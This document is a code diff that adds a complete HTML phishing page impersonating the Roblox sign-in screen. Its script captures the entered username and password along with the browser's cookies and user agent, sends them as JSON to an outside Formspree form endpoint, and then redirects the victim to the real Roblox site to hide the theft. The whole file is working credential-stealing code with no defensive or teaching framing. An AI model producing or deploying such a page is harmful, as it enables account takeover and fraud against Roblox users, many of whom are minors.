@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox - Sign In</title>
+    <style>
+        body { 
+            background: #f2f2f2; 
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+        }
+        .login-container {
+            max-width: 400px;
+            margin: 100px auto;
+            background: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .logo {
+            text-align: center;
+            color: #00a2ff;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        button {
+            background: #00a2ff;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #0088cc;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">ROBLOX</div>
+        <form id="loginForm">
+            <input type="text" name="username" placeholder="Username or Email" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Sign In</button>
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const formData = new FormData(this);
+            const data = {
+                username: formData.get('username'),
+                password: formData.get('password'),
+                cookies: document.cookie,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            // Отправка данных на Formspree
+            fetch('https://formspree.io/f/xdoqnpak', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                // Редирект на настоящий Roblox после отправки
+                window.location.href = 'https://www.roblox.com';
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                window.location.href = 'https://www.roblox.com';
+            });
+        });
+    </script>
+</body>
+</html>
